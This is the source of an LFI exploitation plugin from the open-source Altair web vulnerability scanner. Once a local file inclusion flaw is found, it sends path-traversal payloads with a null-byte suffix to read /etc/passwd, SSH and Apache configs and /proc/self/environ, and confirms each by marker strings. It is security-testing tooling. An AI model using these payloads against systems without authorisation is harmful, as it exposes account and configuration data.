#!/usr/bin/python
# This file is part of Altair web vulnerability scanner.
#
# Copyright(c) 2010-2011 Simone Margaritelli
# evilsocket@gmail.com
# http://www.evilsocket.net
# http://www.backbox.org
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
from ..plugin import *
from ..http import *
from ..kb import *
from threading import Lock

class LFIer(Plugin):
	def __init__( self, pm ):
		Plugin.__init__( self, "lfier", "Simone Margaritelli <evilsocket@gmail.com>", "This module will try to read some standard system files upon LFI vulnerabilities." )
		self.pm    = pm
		self.files = { '/etc/passwd' 		       : '/usr/sbin:',
					   '/etc/ssh/sshd_config'      : 'X11Forwarding',
					   '/etc/hosts'			       : 'localhost',
					   '/etc/apache2/httpd.conf'   : 'LoadModule',
					   '/etc/apache2/apache2.conf' : 'LoadModule',
					   '/etc/apache2/apache.conf'  : 'LoadModule',
					   '/proc/self/environ'		   : 'DOCUMENT_ROOT' }
					   
	def onVulnerabilityFound( self, target, kbitem, parameter ):
		if kbitem.id == "lfi":
			print "[@] Checking for readable files ..."
			for file, match in self.files.items():
				t = target.copy()
				t.setParam( parameter, "%s%%00" % file )
				response = t.fetch()
				if match in response:
					print "\t[!] File '%s' is readable at %s ." % ( file, t.dyn_url.get() )
